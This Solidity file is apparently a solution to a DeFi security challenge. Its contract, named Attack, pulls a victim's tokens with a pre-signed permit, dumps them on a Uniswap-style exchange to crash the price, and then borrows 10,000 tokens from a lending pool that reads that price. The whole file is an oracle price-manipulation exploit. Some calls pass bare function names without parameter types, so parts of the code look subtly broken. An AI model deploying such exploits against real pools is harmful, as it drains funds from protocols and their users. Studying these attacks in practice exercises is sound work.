// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

contract Attack {
    using Address for address;

    address private tokenAddress;
    address private poolAddress;
    address private swapAddress;
    uint8 private v;
    bytes32 private r;
    bytes32 private s;

    constructor(
        address _tokenAdress,
        address _poolAddress,
        address _swapAddress,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) {
        tokenAddress = _tokenAdress;
        poolAddress = _poolAddress;
        swapAddress = _swapAddress;
        v = _v;
        r = _r;
        s = _s;
    }

    function attack(uint tokenAmount) external payable {
        //transfer token
        uint deadline = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "permit",
                msg.sender,
                address(this),
                tokenAmount,
                deadline,
                v,
                r,
                s
            )
        );
        console.log("permit");

        tokenAddress.functionCall(
            abi.encodeWithSignature(
                "transferFrom",
                msg.sender,
                address(this),
                tokenAmount
            )
        );
        console.log("transfer");
        //swap token to eth
        swapAddress.functionCall(
            abi.encodeWithSignature(
                "tokenToEthSwapInput",
                tokenAmount,
                0,
                deadline
            )
        );
        //borrow token
        poolAddress.functionCall(
            abi.encodeWithSignature("borrow", 10000 * 10 ** 18, msg.sender)
        );
    }

    // function deposit(
    //     address owner,
    //     address spender,
    //     uint256 value,
    //     uint256 deadline
    // ) internal {
    //     tokenAddress.functionCall(
    //         abi.encodeWithSignature(
    //             "permit",
    //             owner,
    //             spender,
    //             value,
    //             deadline,
    //             v,
    //             r,
    //             s
    //         )
    //     );

    //     tokenAddress.functionCall(
    //         abi.encodeWithSignature("transferFrom", owner, spender, value)
    //     );
    // }

    // function sweepFunds(address to, uint value) internal {
    //     tokenAddress.functionCall(
    //         abi.encodeWithSignature("transfer", to, value)
    //     );
    // }
}
